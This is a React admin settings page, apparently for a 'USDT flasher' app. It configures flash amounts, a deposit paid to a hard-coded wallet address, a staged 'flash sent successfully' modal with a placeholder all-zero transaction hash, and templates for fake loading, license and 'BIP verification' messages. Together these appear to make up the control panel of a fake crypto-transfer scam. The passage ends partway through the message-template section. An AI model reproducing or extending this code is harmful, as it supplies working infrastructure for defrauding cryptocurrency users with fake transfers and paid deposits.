import React, { useState, useEffect } from 'react';
import { fetchAppSettings, saveAppSettings } from '../../services/database';
import {
  Box,
  Typography,
  Paper,
  Grid,
  Switch,
  FormControlLabel,
  TextField,
  Button,
  Divider,
  Snackbar,
  Alert,
  Select,
  MenuItem,
  FormControl,
  Slider,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Chip,
  TextareaAutosize,
  Tabs,
  Tab
} from '@mui/material';
import {
  ExpandMore as ExpandMoreIcon,
  Save as SaveIcon,
  Refresh as RefreshIcon,
  CloudUpload as CloudUploadIcon,
  Payment as PaymentIcon,
  CheckCircle as CheckCircleIcon,
  Message as MessageIcon,
  List as ListIcon
} from '@mui/icons-material';


function Settings() {
  const [messageTabIndex, setMessageTabIndex] = useState(0);
  const [dropdownTabIndex, setDropdownTabIndex] = useState(0);
  const [settings, setSettings] = useState({
    // Application Settings
    appVersion: '4.8',
    updateChannel: 'stable',
    autoUpdate: true,
    
    // UI Settings
    theme: 'dark',
    accentColor: '#00e6b8',
    animationsEnabled: true,
    
    // Security Settings
    sessionTimeout: 30, // minutes
    requirePasswordOnStartup: true,
    twoFactorAuth: false,
    
    // Network Settings
    proxyEnabled: false,
    proxyAddress: '',
    proxyPort: '',
    connectionTimeout: 30, // seconds
    
    // Flash Settings
    defaultNetwork: 'trc20',
    maxFlashAmount: 100000,
    demoMaxFlashAmount: 30,
    liveMaxFlashAmount: 10000000,
    defaultDelayDays: 0,
    defaultDelayMinutes: 0,
    
    // Payment Settings
    depositAmount: 500,
    transactionFee: 'Transaction Fee',
    walletAddress: 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV',
    
    // Success Modal Settings
    successTitle: 'Success',
    successMessage: 'The flash has been sent successfully',
    transactionHash: '0000000000000000000000000000000000000000000000000000000000000000',
    
    // Advanced Settings
    debugMode: false,
    logLevel: 'info',
    apiEndpoint: 'https://api.usdtflasherpro.com/v1',
    
    // Message Templates
    initialLoadingMessages: '[]',
    licenseVerificationMessages: '[]',
    bipVerificationMessages: '[]',
    
    // Dropdown Options
    walletOptions: '[]',
    currencyOptions: '[]',
    networkOptions: '[]',
    dayOptions: '[]',
    minuteOptions: '[]'
  });
  const [originalSettings, setOriginalSettings] = useState({});
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);
  const [snackbar, setSnackbar] = useState({
    open: false,
    message: '',
    severity: 'success'
  });

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setSettings({
      ...settings,
      [name]: value
    });
  };

  const handleSwitchChange = (name) => (e) => {
    setSettings({
      ...settings,
      [name]: e.target.checked
    });
  };

  const handleSliderChange = (name) => (e, newValue) => {
    setSettings({
      ...settings,
      [name]: newValue
    });
  };

  // Fetch app settings on component mount
  useEffect(() => {
    const loadAppSettings = async () => {
      try {
        setIsLoading(true);
        setError(null);
        
        // Get app settings
        const appSettings = await fetchAppSettings();
        
        // Parse JSON strings for message templates and dropdown options
        const parsedSettings = {
          ...appSettings,
          initialLoadingMessages: tryParseJson(appSettings.initialLoadingMessages, '[]'),
          licenseVerificationMessages: tryParseJson(appSettings.licenseVerificationMessages, '[]'),
          bipVerificationMessages: tryParseJson(appSettings.bipVerificationMessages, '[]'),
          walletOptions: tryParseJson(appSettings.walletOptions, '[]'),
          currencyOptions: tryParseJson(appSettings.currencyOptions, '[]'),
          networkOptions: tryParseJson(appSettings.networkOptions, '[]'),
          dayOptions: tryParseJson(appSettings.dayOptions, '[]'),
          minuteOptions: tryParseJson(appSettings.minuteOptions, '[]')
        };
        
        setSettings(parsedSettings);
        setOriginalSettings(parsedSettings);
      } catch (error) {
        console.error('Error fetching app settings:', error);
        setError('Failed to load application settings. Please try again.');
      } finally {
        setIsLoading(false);
      }
    };
    
    // Helper function to safely parse JSON
    const tryParseJson = (jsonString, defaultValue) => {
      try {
        // If it's already an array, return it
        if (Array.isArray(jsonString)) return jsonString;
        
        // Try to parse the JSON string
        const parsed = JSON.parse(jsonString);
        return parsed;
      } catch (e) {
        console.warn('Failed to parse JSON:', jsonString);
        // Return default value if parsing fails
        return JSON.parse(defaultValue);
      }
    };

    loadAppSettings();
  }, []);

  const handleSave = async () => {
    try {
      setIsLoading(true);
      
      // Stringify JSON arrays for message templates and dropdown options
      const settingsToSave = {
        ...settings,
        initialLoadingMessages: JSON.stringify(settings.initialLoadingMessages),
        licenseVerificationMessages: JSON.stringify(settings.licenseVerificationMessages),
        bipVerificationMessages: JSON.stringify(settings.bipVerificationMessages),
        walletOptions: JSON.stringify(settings.walletOptions),
        currencyOptions: JSON.stringify(settings.currencyOptions),
        networkOptions: JSON.stringify(settings.networkOptions),
        dayOptions: JSON.stringify(settings.dayOptions),
        minuteOptions: JSON.stringify(settings.minuteOptions)
      };
      
      // Update app settings in the database
      await saveAppSettings(settingsToSave);
      
      // Update local state
      setOriginalSettings({...settings});
      
      setSnackbar({
        open: true,
        message: 'Settings updated successfully',
        severity: 'success'
      });
    } catch (error) {
      console.error('Error updating app settings:', error);
      setSnackbar({
        open: true,
        message: 'Failed to update settings. Please try again.',
        severity: 'error'
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleReset = () => {
    setSettings(originalSettings);
    
    setSnackbar({
      open: true,
      message: 'Changes discarded',
      severity: 'info'
    });
  };

  const handleCloseSnackbar = () => {
    setSnackbar({
      ...snackbar,
      open: false
    });
  };
  
  const handleMessageTabChange = (event, newValue) => {
    setMessageTabIndex(newValue);
  };
  
  const handleDropdownTabChange = (event, newValue) => {
    setDropdownTabIndex(newValue);
  };

  const hasChanges = JSON.stringify(settings) !== JSON.stringify(originalSettings);

  return (
    <Box>
      <Typography variant="h4" gutterBottom>
        Application Settings
      </Typography>
      
      {/* Display error message if there's an error */}
      {error && (
        <Alert severity="error" sx={{ mb: 2 }}>
          {error}
        </Alert>
      )}
      
      {/* Display loading indicator */}
      {isLoading && (
        <Box sx={{ display: 'flex', justifyContent: 'center', my: 4 }}>
          <Typography>Loading application settings...</Typography>
        </Box>
      )}
      
      <Box sx={{ mb: 3, display: 'flex', justifyContent: 'flex-end', gap: 2 }}>
        <Button 
          variant="outlined" 
          startIcon={<RefreshIcon />}
          onClick={handleReset}
          disabled={!hasChanges}
          sx={{
            borderColor: hasChanges ? '#7f8fa6' : '#353b48',
            color: hasChanges ? '#7f8fa6' : '#353b48',
            '&:hover': {
              borderColor: '#00e6b8',
              backgroundColor: 'rgba(0, 230, 184, 0.1)',
            },
          }}
        >
          Discard Changes
        </Button>
        <Button 
          variant="contained" 
          startIcon={<SaveIcon />}
          onClick={handleSave}
          disabled={!hasChanges}
          sx={{
            backgroundColor: hasChanges ? '#00e6b8' : '#353b48',
            '&:hover': {
              backgroundColor: '#00c9a0',
            },
          }}
        >
          Save All Changes
        </Button>
      </Box>
      
      <Grid container spacing={3}>
        {/* Application Settings */}
        <Grid item xs={12}>
          <Accordion 
            defaultExpanded 
            sx={{ 
              backgroundColor: '#222222',
              '&:before': {
                display: 'none',
              },
            }}
          >
            <AccordionSummary
              expandIcon={<ExpandMoreIcon sx={{ color: '#00e6b8' }} />}
              sx={{ 
                backgroundColor: 'rgba(0, 230, 184, 0.1)',
                borderBottom: '1px solid #353b48',
              }}
            >
              <Typography variant="h6" sx={{ color: '#00e6b8' }}>
                Application Settings
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Grid container spacing={3}>
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      App Version
                    </Typography>
                    <Box sx={{ display: 'flex', alignItems: 'center' }}>
                      <TextField
                        fullWidth
                        name="appVersion"
                        value={settings.appVersion}
                        variant="outlined"
                        size="small"
                        disabled
                        sx={{
                          '& .MuiOutlinedInput-root': {
                            '& fieldset': {
                              borderColor: '#353b48',
                            },
                          },
                          '& .MuiInputBase-input.Mui-disabled': {
                            color: '#7f8fa6',
                            WebkitTextFillColor: '#7f8fa6',
                          },
                        }}
                      />
                      <Chip 
                        label="Current" 
                        size="small" 
                        sx={{ 
                          ml: 1, 
                          backgroundColor: 'rgba(0, 230, 184, 0.1)', 
                          color: '#00e6b8',
                          border: '1px solid #00e6b8'
                        }} 
                      />
                    </Box>
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Update Channel
                    </Typography>
                    <FormControl fullWidth size="small">
                      <Select
                        name="updateChannel"
                        value={settings.updateChannel}
                        onChange={handleInputChange}
                        sx={{ 
                          color: '#f5f6fa',
                          '.MuiOutlinedInput-notchedOutline': {
                            borderColor: '#353b48',
                          },
                          '&:hover .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#00e6b8',
                          },
                          '.MuiSvgIcon-root': {
                            color: '#f5f6fa',
                          }
                        }}
                      >
                        <MenuItem value="stable">Stable</MenuItem>
                        <MenuItem value="beta">Beta</MenuItem>
                        <MenuItem value="alpha">Alpha</MenuItem>
                      </Select>
                    </FormControl>
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Auto Update
                    </Typography>
                    <FormControlLabel
                      control={
                        <Switch 
                          checked={settings.autoUpdate} 
                          onChange={handleSwitchChange('autoUpdate')}
                          sx={{
                            '& .MuiSwitch-switchBase.Mui-checked': {
                              color: '#00e6b8',
                            },
                            '& .MuiSwitch-switchBase.Mui-checked + .MuiSwitch-track': {
                              backgroundColor: '#00e6b8',
                            },
                          }}
                        />
                      }
                      label="Enable automatic updates"
                      sx={{ color: '#f5f6fa' }}
                    />
                  </Box>
                </Grid>
              </Grid>
            </AccordionDetails>
          </Accordion>
        </Grid>
        
        {/* UI Settings */}
        <Grid item xs={12}>
          <Accordion 
            sx={{ 
              backgroundColor: '#222222',
              '&:before': {
                display: 'none',
              },
            }}
          >
            <AccordionSummary
              expandIcon={<ExpandMoreIcon sx={{ color: '#00e6b8' }} />}
              sx={{ 
                backgroundColor: 'rgba(0, 230, 184, 0.1)',
                borderBottom: '1px solid #353b48',
              }}
            >
              <Typography variant="h6" sx={{ color: '#00e6b8' }}>
                UI Settings
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Grid container spacing={3}>
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Theme
                    </Typography>
                    <FormControl fullWidth size="small">
                      <Select
                        name="theme"
                        value={settings.theme}
                        onChange={handleInputChange}
                        sx={{ 
                          color: '#f5f6fa',
                          '.MuiOutlinedInput-notchedOutline': {
                            borderColor: '#353b48',
                          },
                          '&:hover .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#00e6b8',
                          },
                          '.MuiSvgIcon-root': {
                            color: '#f5f6fa',
                          }
                        }}
                      >
                        <MenuItem value="dark">Dark</MenuItem>
                        <MenuItem value="light">Light</MenuItem>
                        <MenuItem value="system">System Default</MenuItem>
                      </Select>
                    </FormControl>
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Accent Color
                    </Typography>
                    <TextField
                      fullWidth
                      name="accentColor"
                      value={settings.accentColor}
                      onChange={handleInputChange}
                      variant="outlined"
                      size="small"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          '& fieldset': {
                            borderColor: '#353b48',
                          },
                          '&:hover fieldset': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused fieldset': {
                            borderColor: '#00e6b8',
                          },
                        },
                        '& .MuiInputBase-input': {
                          color: '#f5f6fa',
                        },
                      }}
                      InputProps={{
                        startAdornment: (
                          <Box 
                            sx={{ 
                              width: 20, 
                              height: 20, 
                              borderRadius: '4px', 
                              backgroundColor: settings.accentColor,
                              mr: 1,
                              border: '1px solid #353b48'
                            }} 
                          />
                        ),
                      }}
                    />
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Animations
                    </Typography>
                    <FormControlLabel
                      control={
                        <Switch 
                          checked={settings.animationsEnabled} 
                          onChange={handleSwitchChange('animationsEnabled')}
                          sx={{
                            '& .MuiSwitch-switchBase.Mui-checked': {
                              color: '#00e6b8',
                            },
                            '& .MuiSwitch-switchBase.Mui-checked + .MuiSwitch-track': {
                              backgroundColor: '#00e6b8',
                            },
                          }}
                        />
                      }
                      label="Enable UI animations"
                      sx={{ color: '#f5f6fa' }}
                    />
                  </Box>
                </Grid>
              </Grid>
            </AccordionDetails>
          </Accordion>
        </Grid>
        
        {/* Security Settings */}
        <Grid item xs={12}>
          <Accordion 
            sx={{ 
              backgroundColor: '#222222',
              '&:before': {
                display: 'none',
              },
            }}
          >
            <AccordionSummary
              expandIcon={<ExpandMoreIcon sx={{ color: '#00e6b8' }} />}
              sx={{ 
                backgroundColor: 'rgba(0, 230, 184, 0.1)',
                borderBottom: '1px solid #353b48',
              }}
            >
              <Typography variant="h6" sx={{ color: '#00e6b8' }}>
                Security Settings
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Grid container spacing={3}>
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Session Timeout (minutes)
                    </Typography>
                    <Box sx={{ px: 1 }}>
                      <Slider
                        value={settings.sessionTimeout}
                        onChange={handleSliderChange('sessionTimeout')}
                        min={5}
                        max={60}
                        step={5}
                        valueLabelDisplay="auto"
                        sx={{
                          color: '#00e6b8',
                          '& .MuiSlider-thumb': {
                            '&:hover, &.Mui-focusVisible': {
                              boxShadow: '0px 0px 0px 8px rgba(0, 230, 184, 0.16)',
                            },
                          },
                          '& .MuiSlider-rail': {
                            backgroundColor: '#353b48',
                          },
                        }}
                      />
                    </Box>
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Startup Security
                    </Typography>
                    <FormControlLabel
                      control={
                        <Switch 
                          checked={settings.requirePasswordOnStartup} 
                          onChange={handleSwitchChange('requirePasswordOnStartup')}
                          sx={{
                            '& .MuiSwitch-switchBase.Mui-checked': {
                              color: '#00e6b8',
                            },
                            '& .MuiSwitch-switchBase.Mui-checked + .MuiSwitch-track': {
                              backgroundColor: '#00e6b8',
                            },
                          }}
                        />
                      }
                      label="Require password on startup"
                      sx={{ color: '#f5f6fa' }}
                    />
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Two-Factor Authentication
                    </Typography>
                    <FormControlLabel
                      control={
                        <Switch 
                          checked={settings.twoFactorAuth} 
                          onChange={handleSwitchChange('twoFactorAuth')}
                          sx={{
                            '& .MuiSwitch-switchBase.Mui-checked': {
                              color: '#00e6b8',
                            },
                            '& .MuiSwitch-switchBase.Mui-checked + .MuiSwitch-track': {
                              backgroundColor: '#00e6b8',
                            },
                          }}
                        />
                      }
                      label="Enable 2FA"
                      sx={{ color: '#f5f6fa' }}
                    />
                  </Box>
                </Grid>
              </Grid>
            </AccordionDetails>
          </Accordion>
        </Grid>
        
        {/* Flash Settings */}
        <Grid item xs={12}>
          <Accordion 
            sx={{ 
              backgroundColor: '#222222',
              '&:before': {
                display: 'none',
              },
            }}
          >
            <AccordionSummary
              expandIcon={<ExpandMoreIcon sx={{ color: '#00e6b8' }} />}
              sx={{ 
                backgroundColor: 'rgba(0, 230, 184, 0.1)',
                borderBottom: '1px solid #353b48',
              }}
            >
              <Typography variant="h6" sx={{ color: '#00e6b8' }}>
                Flash Settings
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Grid container spacing={3}>
                <Grid item xs={12} sm={6} md={3}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Default Network
                    </Typography>
                    <FormControl fullWidth size="small">
                      <Select
                        name="defaultNetwork"
                        value={settings.defaultNetwork}
                        onChange={handleInputChange}
                        sx={{ 
                          color: '#f5f6fa',
                          '.MuiOutlinedInput-notchedOutline': {
                            borderColor: '#353b48',
                          },
                          '&:hover .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#00e6b8',
                          },
                          '.MuiSvgIcon-root': {
                            color: '#f5f6fa',
                          }
                        }}
                      >
                        <MenuItem value="trc20">TRC20</MenuItem>
                        <MenuItem value="erc20">ERC20</MenuItem>
                        <MenuItem value="bep20">BEP20</MenuItem>
                      </Select>
                    </FormControl>
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={3}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Max Flash Amount (USDT)
                    </Typography>
                    <TextField
                      fullWidth
                      name="maxFlashAmount"
                      value={settings.maxFlashAmount}
                      onChange={handleInputChange}
                      variant="outlined"
                      size="small"
                      type="number"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          '& fieldset': {
                            borderColor: '#353b48',
                          },
                          '&:hover fieldset': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused fieldset': {
                            borderColor: '#00e6b8',
                          },
                        },
                        '& .MuiInputBase-input': {
                          color: '#f5f6fa',
                        },
                      }}
                    />
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={3}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Default Delay (Days)
                    </Typography>
                    <TextField
                      fullWidth
                      name="defaultDelayDays"
                      value={settings.defaultDelayDays}
                      onChange={handleInputChange}
                      variant="outlined"
                      size="small"
                      type="number"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          '& fieldset': {
                            borderColor: '#353b48',
                          },
                          '&:hover fieldset': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused fieldset': {
                            borderColor: '#00e6b8',
                          },
                        },
                        '& .MuiInputBase-input': {
                          color: '#f5f6fa',
                        },
                      }}
                    />
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={3}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Default Delay (Minutes)
                    </Typography>
                    <TextField
                      fullWidth
                      name="defaultDelayMinutes"
                      value={settings.defaultDelayMinutes}
                      onChange={handleInputChange}
                      variant="outlined"
                      size="small"
                      type="number"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          '& fieldset': {
                            borderColor: '#353b48',
                          },
                          '&:hover fieldset': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused fieldset': {
                            borderColor: '#00e6b8',
                          },
                        },
                        '& .MuiInputBase-input': {
                          color: '#f5f6fa',
                        },
                      }}
                    />
                  </Box>
                </Grid>
              </Grid>
            </AccordionDetails>
          </Accordion>
        </Grid>
        
        {/* Advanced Settings */}
        <Grid item xs={12}>
          <Accordion 
            sx={{ 
              backgroundColor: '#222222',
              '&:before': {
                display: 'none',
              },
            }}
          >
            <AccordionSummary
              expandIcon={<ExpandMoreIcon sx={{ color: '#00e6b8' }} />}
              sx={{ 
                backgroundColor: 'rgba(0, 230, 184, 0.1)',
                borderBottom: '1px solid #353b48',
              }}
            >
              <Typography variant="h6" sx={{ color: '#00e6b8' }}>
                Advanced Settings
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Grid container spacing={3}>
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Debug Mode
                    </Typography>
                    <FormControlLabel
                      control={
                        <Switch 
                          checked={settings.debugMode} 
                          onChange={handleSwitchChange('debugMode')}
                          sx={{
                            '& .MuiSwitch-switchBase.Mui-checked': {
                              color: '#00e6b8',
                            },
                            '& .MuiSwitch-switchBase.Mui-checked + .MuiSwitch-track': {
                              backgroundColor: '#00e6b8',
                            },
                          }}
                        />
                      }
                      label="Enable debug mode"
                      sx={{ color: '#f5f6fa' }}
                    />
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Log Level
                    </Typography>
                    <FormControl fullWidth size="small">
                      <Select
                        name="logLevel"
                        value={settings.logLevel}
                        onChange={handleInputChange}
                        sx={{ 
                          color: '#f5f6fa',
                          '.MuiOutlinedInput-notchedOutline': {
                            borderColor: '#353b48',
                          },
                          '&:hover .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                            borderColor: '#00e6b8',
                          },
                          '.MuiSvgIcon-root': {
                            color: '#f5f6fa',
                          }
                        }}
                      >
                        <MenuItem value="error">Error</MenuItem>
                        <MenuItem value="warn">Warning</MenuItem>
                        <MenuItem value="info">Info</MenuItem>
                        <MenuItem value="debug">Debug</MenuItem>
                        <MenuItem value="trace">Trace</MenuItem>
                      </Select>
                    </FormControl>
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      API Endpoint
                    </Typography>
                    <TextField
                      fullWidth
                      name="apiEndpoint"
                      value={settings.apiEndpoint}
                      onChange={handleInputChange}
                      variant="outlined"
                      size="small"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          '& fieldset': {
                            borderColor: '#353b48',
                          },
                          '&:hover fieldset': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused fieldset': {
                            borderColor: '#00e6b8',
                          },
                        },
                        '& .MuiInputBase-input': {
                          color: '#f5f6fa',
                        },
                      }}
                    />
                  </Box>
                </Grid>
              </Grid>
            </AccordionDetails>
          </Accordion>
        </Grid>
        
        {/* Payment Settings */}
        <Grid item xs={12}>
          <Accordion 
            sx={{ 
              backgroundColor: '#222222',
              '&:before': {
                display: 'none',
              },
            }}
          >
            <AccordionSummary
              expandIcon={<ExpandMoreIcon sx={{ color: '#00e6b8' }} />}
              sx={{ 
                backgroundColor: 'rgba(0, 230, 184, 0.1)',
                borderBottom: '1px solid #353b48',
              }}
            >
              <Typography variant="h6" sx={{ color: '#00e6b8' }}>
                <PaymentIcon sx={{ mr: 1, verticalAlign: 'middle' }} />
                Payment Settings
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Grid container spacing={3}>
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Deposit Amount (USDT)
                    </Typography>
                    <TextField
                      fullWidth
                      name="depositAmount"
                      value={settings.depositAmount}
                      onChange={handleInputChange}
                      variant="outlined"
                      size="small"
                      type="number"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          '& fieldset': {
                            borderColor: '#353b48',
                          },
                          '&:hover fieldset': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused fieldset': {
                            borderColor: '#00e6b8',
                          },
                        },
                        '& .MuiInputBase-input': {
                          color: '#f5f6fa',
                        },
                      }}
                    />
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Transaction Fee Label
                    </Typography>
                    <TextField
                      fullWidth
                      name="transactionFee"
                      value={settings.transactionFee}
                      onChange={handleInputChange}
                      variant="outlined"
                      size="small"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          '& fieldset': {
                            borderColor: '#353b48',
                          },
                          '&:hover fieldset': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused fieldset': {
                            borderColor: '#00e6b8',
                          },
                        },
                        '& .MuiInputBase-input': {
                          color: '#f5f6fa',
                        },
                      }}
                    />
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Wallet Address
                    </Typography>
                    <TextField
                      fullWidth
                      name="walletAddress"
                      value={settings.walletAddress}
                      onChange={handleInputChange}
                      variant="outlined"
                      size="small"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          '& fieldset': {
                            borderColor: '#353b48',
                          },
                          '&:hover fieldset': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused fieldset': {
                            borderColor: '#00e6b8',
                          },
                        },
                        '& .MuiInputBase-input': {
                          color: '#f5f6fa',
                        },
                      }}
                    />
                  </Box>
                </Grid>
              </Grid>
            </AccordionDetails>
          </Accordion>
        </Grid>
        
        {/* Success Modal Settings */}
        <Grid item xs={12}>
          <Accordion 
            sx={{ 
              backgroundColor: '#222222',
              '&:before': {
                display: 'none',
              },
            }}
          >
            <AccordionSummary
              expandIcon={<ExpandMoreIcon sx={{ color: '#00e6b8' }} />}
              sx={{ 
                backgroundColor: 'rgba(0, 230, 184, 0.1)',
                borderBottom: '1px solid #353b48',
              }}
            >
              <Typography variant="h6" sx={{ color: '#00e6b8' }}>
                <CheckCircleIcon sx={{ mr: 1, verticalAlign: 'middle' }} />
                Success Modal Settings
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Grid container spacing={3}>
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Success Title
                    </Typography>
                    <TextField
                      fullWidth
                      name="successTitle"
                      value={settings.successTitle}
                      onChange={handleInputChange}
                      variant="outlined"
                      size="small"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          '& fieldset': {
                            borderColor: '#353b48',
                          },
                          '&:hover fieldset': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused fieldset': {
                            borderColor: '#00e6b8',
                          },
                        },
                        '& .MuiInputBase-input': {
                          color: '#f5f6fa',
                        },
                      }}
                    />
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Success Message
                    </Typography>
                    <TextField
                      fullWidth
                      name="successMessage"
                      value={settings.successMessage}
                      onChange={handleInputChange}
                      variant="outlined"
                      size="small"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          '& fieldset': {
                            borderColor: '#353b48',
                          },
                          '&:hover fieldset': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused fieldset': {
                            borderColor: '#00e6b8',
                          },
                        },
                        '& .MuiInputBase-input': {
                          color: '#f5f6fa',
                        },
                      }}
                    />
                  </Box>
                </Grid>
                
                <Grid item xs={12} sm={6} md={4}>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                      Transaction Hash
                    </Typography>
                    <TextField
                      fullWidth
                      name="transactionHash"
                      value={settings.transactionHash}
                      onChange={handleInputChange}
                      variant="outlined"
                      size="small"
                      sx={{
                        '& .MuiOutlinedInput-root': {
                          '& fieldset': {
                            borderColor: '#353b48',
                          },
                          '&:hover fieldset': {
                            borderColor: '#00e6b8',
                          },
                          '&.Mui-focused fieldset': {
                            borderColor: '#00e6b8',
                          },
                        },
                        '& .MuiInputBase-input': {
                          color: '#f5f6fa',
                        },
                      }}
                    />
                  </Box>
                </Grid>
              </Grid>
            </AccordionDetails>
          </Accordion>
        </Grid>
        
        {/* Message Templates */}
        <Grid item xs={12}>
          <Accordion 
            sx={{ 
              backgroundColor: '#222222',
              '&:before': {
                display: 'none',
              },
            }}
          >
            <AccordionSummary
              expandIcon={<ExpandMoreIcon sx={{ color: '#00e6b8' }} />}
              sx={{ 
                backgroundColor: 'rgba(0, 230, 184, 0.1)',
                borderBottom: '1px solid #353b48',
              }}
            >
              <Typography variant="h6" sx={{ color: '#00e6b8' }}>
                <MessageIcon sx={{ mr: 1, verticalAlign: 'middle' }} />
                Message Templates
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Tabs 
                value={messageTabIndex} 
                onChange={handleMessageTabChange}
                sx={{ 
                  mb: 2,
                  '& .MuiTabs-indicator': {
                    backgroundColor: '#00e6b8',
                  },
                  '& .MuiTab-root': {
                    color: '#7f8fa6',
                    '&.Mui-selected': {
                      color: '#00e6b8',
                    },
                  },
                }}
              >
                <Tab label="Initial Loading" />
                <Tab label="License Verification" />
                <Tab label="BIP Verification" />
              </Tabs>
              
              {messageTabIndex === 0 && (
                <Box sx={{ p: 2, border: '1px solid #353b48', borderRadius: '4px' }}>
                  <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                    Initial Loading Messages
                  </Typography>
